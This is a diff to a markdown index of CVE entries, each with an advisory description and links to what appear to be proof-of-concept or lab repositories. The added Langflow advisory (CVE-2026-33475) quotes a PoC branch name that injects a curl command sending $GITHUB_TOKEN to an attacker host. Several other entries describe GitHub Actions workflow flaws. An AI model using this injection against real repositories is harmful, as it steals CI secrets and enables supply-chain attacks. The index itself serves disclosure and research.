@@ -1914,13 +1914,6 @@
 
 - [Alixploit22/CVE-2026-6440](https://github.com/Alixploit22/CVE-2026-6440)
 
-### CVE-2026-6471 (2026-08-13)
-
-<code>Missing authorization in PostgreSQL logical decoding allows a non-superuser holding REPLICATION privilege to dlopen any file visible to the operating system account running the server, via the choice of logical decoding plugin.  This in turn runs arbitrary code as that account.  Versions before PostgreSQL 18.6, 17.11, 16.15, 15.19, and 14.24 are affected.
-</code>
-
-- [HORKimhab/CVE-2026-6471](https://github.com/HORKimhab/CVE-2026-6471)
-
 ### CVE-2026-6508 (2026-05-07)
 
 <code>Origin Validation Error vulnerability in TUBITAK BILGEM Software Technologies Research Institute Liderahenk allows Accessing Functionality Not Properly Constrained by ACLs.\n\nThis issue affects Liderahenk: from 2.0.1 before 2.0.2.
@@ -6793,6 +6786,13 @@
 
 - [ngtuonghung/CVE-2026-27940](https://github.com/ngtuonghung/CVE-2026-27940)
 
+### CVE-2026-27941 (2026-02-26)
+
+<code>OpenLIT is an open source platform for AI engineering. Prior to version 1.37.1, several GitHub Actions workflows in OpenLIT's GitHub repository use the `pull_request_target` event while checking out and executing untrusted code from forked pull requests. These workflows run with the security context of the base repository, including a write-privileged `GITHUB_TOKEN` and numerous sensitive secrets (API keys, database/vector store tokens, and a Google Cloud service account key). Version 1.37.1 contains a fix.
+</code>
+
+- [pvharmo2/gha-lab-6c3094af9e](https://github.com/pvharmo2/gha-lab-6c3094af9e)
+
 ### CVE-2026-27944 (2026-03-05)
 
 <code>Nginx UI is a web user interface for the Nginx web server. Prior to version 2.3.3, the /api/backup endpoint is accessible without authentication and discloses the encryption keys required to decrypt the backup in the X-Backup-Security response header. This allows an unauthenticated attacker to download a full system backup containing sensitive data (user credentials, session tokens, SSL private keys, Nginx configurations) and decrypt it immediately. This issue has been patched in version 2.3.3.
@@ -7034,6 +7034,13 @@
 </code>
 
 - [Chocapikk/Windfall](https://github.com/Chocapikk/Windfall)
+
+### CVE-2026-29075 (2026-03-06)
+
+<code>Mesa is an open-source Python library for agent-based modeling, simulating complex systems and exploring emergent behaviors. In version 3.5.0 and prior, checking out of untrusted code in benchmarks.yml workflow may lead to code execution in privileged runner. This issue has been patched via commit c35b8cd.
+</code>
+
+- [pvharmo2/gha-lab-ca4fa82ac5](https://github.com/pvharmo2/gha-lab-ca4fa82ac5)
 
 ### CVE-2026-29114 (2026-06-10)
 
@@ -7596,7 +7603,6 @@
 - [mlazzarotto/copy-fail-CVE-2026-31431-mitigation-ansible-playbook](https://github.com/mlazzarotto/copy-fail-CVE-2026-31431-mitigation-ansible-playbook)
 - [ExploitEoom/CVE-2026-31431](https://github.com/ExploitEoom/CVE-2026-31431)
 - [ben-slates/CVE-2026-31431-Exploit](https://github.com/ben-slates/CVE-2026-31431-Exploit)
-- [sercuritycyber/COPY-FAIL-CVE-2026-31431](https://github.com/sercuritycyber/COPY-FAIL-CVE-2026-31431)
 - [bootsareme/copyfail-deconstructed](https://github.com/bootsareme/copyfail-deconstructed)
 - [mrunalp/block-copyfail](https://github.com/mrunalp/block-copyfail)
 - [1amBa7Man/Linux-copy-fail-CVE-2026-31431](https://github.com/1amBa7Man/Linux-copy-fail-CVE-2026-31431)
@@ -7852,6 +7858,13 @@
 </code>
 
 - [Mothra-1/CVE-2026-31844](https://github.com/Mothra-1/CVE-2026-31844)
+
+### CVE-2026-31852 (2026-03-11)
+
+<code>Jellyfin is an open-source media system. The code-quality.yml GitHub Actions workflow in jellyfin/jellyfin-ios is vulnerable to arbitrary code execution via pull requests from forked repositories. Due to the workflow's elevated permissions (nearly all write permissions), this vulnerability enables full repository takeover of jellyfin/jellyfin-ios, exfiltration of highly privileged secrets, Apple App Store supply chain attack, GitHub Container Registry (ghcr.io) package poisoning, and full jellyfin organization compromise via cross-repository token usage. Note: This is not a code vulnerability, but a vulnerability in the GitHub Actions workflows. No new version is required for this GHSA and end users do not need to take any actions.
+</code>
+
+- [pvharmo2/gha-lab-3f1ff30e9c](https://github.com/pvharmo2/gha-lab-3f1ff30e9c)
 
 ### CVE-2026-31891 (2026-03-18)
 
@@ -8194,6 +8207,13 @@
 
 - [Lopseg/cve-2026-33067](https://github.com/Lopseg/cve-2026-33067)
 
+### CVE-2026-33075 (2026-03-20)
+
+<code>FastGPT is an AI Agent building platform. In versions 4.14.8.3 and below, the fastgpt-preview-image.yml workflow is vulnerable to arbitrary code execution and secret exfiltration by any external contributor. It uses pull_request_target (which runs with access to repository secrets) but checks out code from the pull request author's fork, then builds and pushes Docker images using attacker-controlled Dockerfiles. This also enables a supply chain attack via the production container registry. A patch was not available at the time of publication.
+</code>
+
+- [pvharmo2/gha-lab-61c59f4acb](https://github.com/pvharmo2/gha-lab-61c59f4acb)
+
 ### CVE-2026-33137 (2026-05-20)
 
 <code>XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. XWiki Platform is a generic wiki platform. In versions starting with 15.10.6 and prior to 18.1.0-rc-1, 17.10.3, 17.4.9, and 16.10.17, the POST /wikis/{wikiName} API executes a XAR import without performing any authentication or authorization checks, allowing an unauthenticated attacker to create or update documents in the target wiki. This vulnerability has been patched in XWiki 16.10.17, 17.4.9, 17.10.3, 18.0.1 and 18.1.0-rc-1.
@@ -8317,6 +8337,13 @@
 </code>
 
 - [oscerd/CVE-2026-33454](https://github.com/oscerd/CVE-2026-33454)
+
+### CVE-2026-33475 (2026-03-24)
+
+<code>Langflow is a tool for building and deploying AI-powered agents and workflows. An unauthenticated remote shell injection vulnerability exists in multiple GitHub Actions workflows in the Langflow repository prior to version 1.9.0. Unsanitized interpolation of GitHub context variables (e.g., `${{ github.head_ref }}`) in `run:` steps allows attackers to inject and execute arbitrary shell commands via a malicious branch name or pull request title. This can lead to secret exfiltration (e.g., `GITHUB_TOKEN`), infrastructure manipulation, or supply chain compromise during CI/CD execution. Version 1.9.0 patches the vulnerability.\n\n---\n\n### Details\n\nSeveral workflows in `.github/workflows/` and `.github/actions/` reference GitHub context variables directly in `run:` shell commands, such as:\n\n```yaml\nrun: |\n  validate_branch_name &quot;${{ github.event.pull_request.head.ref }}&quot;\n```\n\nOr:\n\n```yaml\nrun: npx playwright install ${{ inputs.browsers }} --with-deps\n```\n\nSince `github.head_ref`, `github.event.pull_request.title`, and custom `inputs.*` may contain **user-controlled values**, they must be treated as **untrusted input**. Direct interpolation without proper quoting or sanitization leads to shell command injection.\n\n---\n\n### PoC\n\n1. **Fork** the Langflow repository\n2. **Create a new branch** with the name:\n   ```bash\n   injection-test &amp;&amp; curl https://attacker.site/exfil?token=$GITHUB_TOKEN\n   ```\n3. **Open a Pull Request** to the main branch from the new branch\n4. GitHub Actions will run the affected workflow (e.g., `deploy-docs-draft.yml`)\n5. The `run:` step containing:\n   ```yaml\n   echo &quot;Branch: ${{ github.head_ref }}&quot;\n   ```\n   Will execute:\n   ```bash\n   echo &quot;Branch: injection-test&quot;\n   curl https://attacker.site/exfil?token=$GITHUB_TOKEN\n   ```\n\n6. The attacker receives the CI secret via the exfil URL.\n\n---\n\n### Impact\n\n- **Type:** Shell Injection / Remote Code Execution in CI\n- **Scope:** Any public Langflow fork with GitHub Actions enabled\n- **Impact:** Full access to CI secrets (e.g., `GITHUB_TOKEN`), possibility to push malicious tags or images, tamper with releases, or leak sensitive infrastructure data\n\n---\n\n### Suggested Fix\n\nRefactor affected workflows to **use environment variables** and wrap them in **double quotes**:\n\n```yaml\nenv:\n  BRANCH_NAME: ${{ github.head_ref }}\nrun: |\n  echo &quot;Branch is: \&quot;$BRANCH_NAME\&quot;&quot;\n```\n\nAvoid direct `${{ ... }}` interpolation inside `run:` for any user-controlled value.\n\n---\n\n### Affected Files (Langflow `1.3.4`)\n\n- `.github/actions/install-playwright/action.yml`\n- `.github/workflows/deploy-docs-draft.yml`\n- `.github/workflows/docker-build.yml`\n- `.github/workflows/release_nightly.yml`\n- `.github/workflows/python_test.yml`\n- `.github/workflows/typescript_test.yml`
+</code>
+
+- [pvharmo2/gha-lab-9b5e3ccfbe](https://github.com/pvharmo2/gha-lab-9b5e3ccfbe)
 
 ### CVE-2026-33531 (2026-03-26)
 
@@ -8662,6 +8689,13 @@
 
 - [rootdirective-sec/CVE-2026-34234-Lab](https://github.com/rootdirective-sec/CVE-2026-34234-Lab)
 
+### CVE-2026-34243 (2026-03-31)
+
+<code>wenxian is a tool to generate BIBTEX files from given identifiers (DOI, PMID, arXiv ID, or paper title). In versions 0.3.1 and prior, a GitHub Actions workflow uses untrusted user input from issue_comment.body directly inside a shell command, allowing potential command injection and arbitrary code execution on the runner. At time of publication, there are no publicly available patches.
+</code>
+
+- [pvharmo2/gha-lab-85f022290a](https://github.com/pvharmo2/gha-lab-85f022290a)
+
 ### CVE-2026-34308 (2026-04-21)
 
 <code>Vulnerability in the MySQL Server product of Oracle MySQL (component: Server: JSON).  Supported versions that are affected are 8.0.0-8.0.45, 8.4.0-8.4.8 and  9.0.0-9.6.0. Easily exploitable vulnerability allows low privileged attacker with network access via multiple protocols to compromise MySQL Server.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.1 Base Score 6.5 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).
@@ -8931,6 +8965,13 @@
 </code>
 
 - [Rickidevs/CVE-2026-35570](https://github.com/Rickidevs/CVE-2026-35570)
+
+### CVE-2026-35580 (2026-04-07)
+
+<code>Emissary is a P2P based data-driven workflow engine. Prior to 8.39.0, GitHub Actions workflow files contained shell injection points where user-controlled workflow_dispatch inputs were interpolated directly into shell commands via ${{ }} expression syntax. An attacker with repository write access could inject arbitrary shell commands, leading to repository poisoning and supply chain compromise affecting all downstream users. This vulnerability is fixed in 8.39.0.
+</code>
+
+- [pvharmo2/gha-lab-ed7a1740c4](https://github.com/pvharmo2/gha-lab-ed7a1740c4)
 
 ### CVE-2026-35584 (2026-04-07)
 
@@ -11640,7 +11681,11 @@
 
 - [romain-deperne/CVE-2026-48017](https://github.com/romain-deperne/CVE-2026-48017)
 
-### CVE-2026-48019
+### CVE-2026-48019 (2026-09-04)
+
+<code>Laravel is a web application framework. Prior to versions 12.60.0 and 13.10.0, a CRLF injection vulnerability in Laravel's email validation, in combination with how Symfony Mailer and Symfony Mime handle certain character sequences, may allow an unauthenticated attacker to interfere with outbound email processing in applications that send mail to user-supplied addresses. This issue has been patched in versions 12.60.0 and 13.10.0.
+</code>
+
 - [derrickschoen/laravel-framework](https://github.com/derrickschoen/laravel-framework)
 
 ### CVE-2026-48020 (2026-06-23)
@@ -13599,6 +13644,13 @@
 
 - [4n4s4zi/tfo-connect-bypass](https://github.com/4n4s4zi/tfo-connect-bypass)
 
+### CVE-2026-64468 (2026-07-25)
+
+<code>In the Linux kernel, the following vulnerability has been resolved:\n\nbinder: fix UAF in binder_free_transaction()\n\nIn binder_free_transaction(), the t-&gt;to_proc is read under the t-&gt;lock.\nHowever, once the t-&gt;lock is dropped, the to_proc can die in parallel.\nThis leads to a use-after-free error when we attempt to acquire its\ninner lock right afterwards:\n\n  ==================================================================\n  BUG: KASAN: slab-use-after-free in _raw_spin_lock+0xe4/0x1a0\n  Write of size 4 at addr ffff00001125da70 by task B/672\n\n  CPU: 20 UID: 0 PID: 672 Comm: B Not tainted 7.1.0-rc6-00284-g8e65320d91cd #4 PREEMPT\n  Hardware name: linux,dummy-virt (DT)\n  Call trace:\n   _raw_spin_lock+0xe4/0x1a0\n   binder_free_transaction+0x8c/0x320\n   binder_send_failed_reply+0x21c/0x2f8\n   binder_thread_release+0x488/0x7e0\n   binder_ioctl+0x12c0/0x29a0\n  [...]\n\n  Allocated by task 675:\n   __kmalloc_cache_noprof+0x174/0x444\n   binder_open+0x118/0xb70\n   do_dentry_open+0x374/0x1040\n   vfs_open+0x58/0x3bc\n  [...]\n\n  Freed by task 212:\n   __kasan_slab_free+0x58/0x80\n   kfree+0x1a0/0x4a4\n   binder_proc_dec_tmpref+0x32c/0x5e0\n   binder_deferred_func+0xc48/0x104c\n   process_one_work+0x53c/0xbc0\n  [...]\n  ==================================================================\n\nTo prevent this, pin the target thread (t-&gt;to_thread) to guarantee the\ntarget process remains alive. Undelivered transactions without a target\nthread are already safe, as the target process can only be the current\ncontext in those paths.
+</code>
+
+- [aramosf/CVE-2026-64468](https://github.com/aramosf/CVE-2026-64468)
+
 ### CVE-2026-64531 (2026-07-27)
 
 <code>In the Linux kernel, the following vulnerability has been resolved:\n\nnet: openvswitch: reject oversized nested action attrs\n\nOpen vSwitch stores generated flow actions as nlattrs, whose nla_len\nfield is u16. Commit a1e64addf3ff (&quot;net: openvswitch: remove\nmisbehaving actions length check&quot;) allowed the total sw_flow_actions\nstream to grow beyond 64 KiB, which is valid, but also removed the last\nguard preventing a generated nested action attribute from exceeding\nU16_MAX.\n\nAn oversized generated container can thus be closed with a truncated\nnla_len. A later dump or teardown then walks a structurally different\nstream than the one that was validated. In particular, an oversized\nnested CLONE/CT action may cause subsequent bytes in the generated\nstream to be interpreted as independent actions.\n\nKeep the larger total-action-stream behavior, but make nested action\nclose reject generated containers that do not fit in nla_len, and return\nthe error through all callers. For recursive SAMPLE, CLONE, DEC_TTL, and\nCHECK_PKT_LEN builders, trim resource-owning action-list tails in reverse\nconstruction order before discarding failed wrappers, so resources copied\ninto the rejected tails are released before the wrappers are removed.\n\nMost failed outer wrappers are discarded by truncating actions_len after\nchild resources have been released. CHECK_PKT_LEN also trims its parent\nafter branch resources are gone. SET/TUNNEL close failures unwind their\nknown tun_dst ownership directly, and SET_TO_MASKED has no external\nownership and truncates on close failure.
@@ -14947,6 +14999,13 @@
 
 - [HORKimhab/CVE-2026-85046](https://github.com/HORKimhab/CVE-2026-85046)
 - [ubitquity/CVE-2026-85046-Patch-confusion-zero-day-vulnerability-in-Google-Chrome-s-V8-engine](https://github.com/ubitquity/CVE-2026-85046-Patch-confusion-zero-day-vulnerability-in-Google-Chrome-s-V8-engine)
+
+### CVE-2026-85649 (2026-09-04)
+
+<code>(Holloway) Chew, Kean Ho's Actualizer v1.2.0 and earlier contains a fail-open password validation vulnerability in the Alpha user and root user password loops of Shell/debian-minbase-install.sh. The installer invokes mkpasswd to generate yescrypt password hashes but does not check the command's return value and unconditionally accepts the result. If mkpasswd fails to generate a yescrypt hash, for example because an incompatible mkpasswd implementation or an environment without yescrypt support is used, the resulting password hash variable can be empty and the build proceeds. The resulting image can therefore contain empty password fields for the root and alpha accounts, potentially permitting passwordless authentication depending on the authentication configuration.
+</code>
+
+- [ChewKeanHo/research-cve-2026-85649](https://github.com/ChewKeanHo/research-cve-2026-85649)
 
 ### CVE-2026-85769 (2026-09-04)
 
@@ -27210,7 +27269,7 @@
 
 ### CVE-2025-67038 (2026-03-11)
 
-<code>An issue was discovered in Lantronix EDS5000 2.1.0.0R3. The HTTP RPC module executes a shell command to write logs when user's authantication fails. The username is directly concatenated with the command without any sanitization. This allow attackers to inject arbitrary OS commands into the username parameter. Injected commands are executed with root privileges.
+<code>An issue was discovered in Lantronix EDS5000 2.1.0.0R3. The HTTP RPC module executes a shell command to write logs when user's authentication fails. The username is directly concatenated with the command without any sanitization. This allow attackers to inject arbitrary OS commands into the username parameter. Injected commands are executed with root privileges.
 </code>
 
 - [HORKimhab/CVE-2025-67038](https://github.com/HORKimhab/CVE-2025-67038)
